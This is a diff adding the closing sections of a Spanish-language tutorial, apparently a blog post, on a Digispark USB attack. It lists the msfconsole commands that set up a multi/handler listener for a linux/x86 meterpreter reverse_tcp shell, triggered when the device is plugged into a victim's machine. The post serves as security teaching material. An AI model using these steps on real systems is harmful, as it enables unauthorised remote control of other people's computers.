@@ -113,4 +113,21 @@ Para terminar esta parte, verificaremos nuestro programa, le daremos a subir y i
 # Configurando msfconsole
 Llegados hasta aqui, ahora solo nos queda la parte divertida, configuraremos msfconsole para que se ponga a la escucha de conexiones TCP y explotar el sistema cuando se ejecute el payload en el equipo víctima. bien empezemos:
   - Ejecutamos en una terminal msfconsole -q (-q es para que no nos aparezca el banner)
-  -
+  - Ejecutamos `use exploit/multi/handler` para seleccionar el exploit.
+  - Ahora pasemos a configurar los parametros, pondremos set LHOST (NUESTRA IP) en mi caso: `set LHOST 192.168.100.20`.
+  - Posteriormente establecemos el puerto que pusimos en el payload, en mi caso el 5000: `set LPORT 5000`.
+  - Por ultimo seleccionamos el PAYLOAD que usamos anteriormente: `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, y los datos que pusimos anteriormente se cargaran alli.
+  
+Siempre podemos usar `show options` para ver si hemos configurado correctamente todo.
+  
+  [foto3](/images/foto3.png)
+  
+Llegados a este punto ya podriamos probar si funciona nuestra prueba...
+
+# Exploit...
+
+Bien, por fin hemos llegado a la prueba de la verdad, es hora de enchufar nuestro Digispark al ordenador y ver si funciona, no obstante antes hay que poner meterpreter a la escucha, asique teclearemos en nuestra msfconsole: `exploit`, y ya se pondra a la escucha de la conexion TCP.
+
+Aqui os dejo un pequeño video de lo que ocurre al enchufar nuestro Digispark, espero que os haya gustado, cualquier duda dejenmelo saber enviandome un mail.
+
+  
